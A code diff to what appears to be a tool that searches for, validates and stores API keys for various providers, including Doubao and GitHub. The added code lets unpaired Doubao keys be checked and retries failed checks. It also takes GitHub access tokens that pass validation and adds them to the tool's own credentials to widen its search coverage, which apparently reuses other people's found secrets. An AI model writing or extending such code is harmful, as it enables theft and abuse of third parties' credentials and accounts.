@@ -142,7 +142,16 @@ class SearchStage(BasePipelineStage):
                         pair_half = (getattr(key_service, 'meta', {}) or {}).get('pair_half', '')
                     except Exception:
                         pair_half = ''
+                    provider_lower = (task.provider or '').lower()
                     if ep_required and (not has_endpoint or pair_half):
+                        # Normally skip half-candidates until paired. However, for Doubao we can
+                        # attempt a check with default model even without endpoint, as the API
+                        # accepts model name or endpoint id. Only proceed when a key is present.
+                        if provider_lower == 'doubao' and getattr(key_service, 'key', ''):
+                            check_task = TaskFactory.create_check_task(task.provider, key_service)
+                            output.add_task(check_task, PipelineStage.CHECK.value)
+                            scheduled += 1
+                            continue
                         skipped_half += 1
                         continue
                     check_task = TaskFactory.create_check_task(task.provider, key_service)
@@ -747,6 +756,22 @@ class CheckStage(BasePipelineStage):
                 # Add valid key to be saved
                 output.add_result(task.provider, ResultType.VALID.value, [task.service])
 
+                # If we just validated a GitHub PAT, feed it into runtime credentials to boost coverage
+                try:
+                    prov = (task.provider or '').lower()
+                    if prov in ('github', 'github_pat'):
+                        from tools.coordinator import get_credentials_manager, update_credentials
+                        creds = get_credentials_manager()
+                        token = (task.service.key or '').strip()
+                        if token and (token.startswith('github_pat_') or token.startswith('ghp_')) and creds:
+                            # Deduplicate and append
+                            current_sessions = list(creds.sessions) if hasattr(creds, 'sessions') else []
+                            current_tokens = list(creds.tokens) if hasattr(creds, 'tokens') else []
+                            if token not in current_tokens:
+                                update_credentials(current_sessions, current_tokens + [token])
+                except Exception:
+                    pass
+
             else:
                 # Categorize based on error reason
                 if result.reason == ErrorReason.NO_QUOTA:
@@ -757,7 +782,14 @@ class CheckStage(BasePipelineStage):
                     ErrorReason.NO_MODEL,
                     ErrorReason.NO_ACCESS,
                 ]:
+                    # Persist to wait-check and schedule limited retries to avoid stall
                     output.add_result(task.provider, ResultType.WAIT_CHECK.value, [task.service])
+                    try:
+                        if task.attempts < self.max_retries:
+                            task.attempts += 1
+                            output.add_task(task, PipelineStage.CHECK.value)
+                    except Exception:
+                        pass
 
                 else:
                     output.add_result(task.provider, ResultType.INVALID.value, [task.service])
